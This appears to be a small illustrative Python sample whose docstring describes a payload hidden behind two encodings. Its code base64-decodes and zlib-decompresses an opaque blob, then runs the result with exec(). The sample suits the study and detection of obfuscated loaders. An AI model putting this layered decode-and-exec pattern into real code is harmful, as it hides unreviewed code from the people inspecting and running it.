"""A payload behind two encodings rather than one.

Each layer exists only to make the payload unrecognisable to whatever inspected
the layer above. A single base64 decode has ordinary uses; base64 into
decompression into execution has none.
"""

import base64
import zlib

BLOB = "eNorTi0sTS1SSM7PLShKLS5OTVFIzs8tKEotLk5NUQAAoTMK1g=="

stage_one = base64.b64decode(BLOB)
stage_two = zlib.decompress(stage_one)
exec(stage_two.decode())
